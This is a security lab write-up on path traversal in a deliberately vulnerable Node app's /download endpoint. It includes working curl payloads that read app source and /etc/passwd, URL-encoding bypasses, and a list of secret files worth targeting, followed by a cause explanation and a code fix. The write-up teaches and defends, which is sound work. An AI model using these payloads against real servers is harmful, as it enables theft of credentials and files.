# Lab 15: Path traversal on the download endpoint

The image download endpoint joins the `?file=` parameter to the images folder and reads it from disk. `../` climbs out of the directory.

**OWASP Top 10:2025:** [A01 Broken Access Control](https://owasp.org/Top10/2025/) (CWE-22)

**Code:** `routes/extras.js` (`/download`)

## Exploit

1. The endpoint serves any file the app process can read — no login needed:

```bash
curl -s "http://localhost:8888/download?file=keyboard.svg" -o /tmp/ok.svg && head -c 60 /tmp/ok.svg
# <svg xmlns="http://www.w3.org/2000/svg"...   ← normal usage works
```

2. Escape the images directory with `../` sequences:

```bash
curl -s "http://localhost:8888/download?file=../../db/seed-data.js" | head -5
# // Seed data. Geek merch, same spirit as the original vulnerable-node catalog.
# ...  ← app source code
```

3. Read system files:

```bash
curl -s "http://localhost:8888/download?file=../../../../../etc/passwd" | head -3
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Inside the container, `/app` is the working directory, so `../../../../../etc/passwd` (5 levels) reaches the root. Depth is guessable or brute-forceable; `..%2f` and double-encoding (`..%252f`) work on misconfigured reverse proxies too.

4. Juicy targets in a real deployment: `.env`, database credentials, `/proc/self/environ`, application logs with secrets (lab 10 feeds this one).

## Why it happens

`path.join(base, userInput)` normalizes `..` away — it *joins*, it does not *contain*. The result can point anywhere the process can read.

## Fix

```js
// Option 1 — treat the input as a bare filename:
const name = path.basename(req.query.file || "");          // strips any ../
const full = path.join(IMG_DIR, name);
if (!full.startsWith(IMG_DIR + path.sep)) return res.status(400).end();

// Option 2 — best: don't take a path at all. Serve by product id and let
// the DB tell you which image belongs to it:
//   /download?productId=2  →  image = products.image
```

## Verify

After the fix, `?file=../../db/seed-data.js` returns 404/400, and `?file=keyboard.svg` still works.

Related: command injection in the same admin surface — lab 16.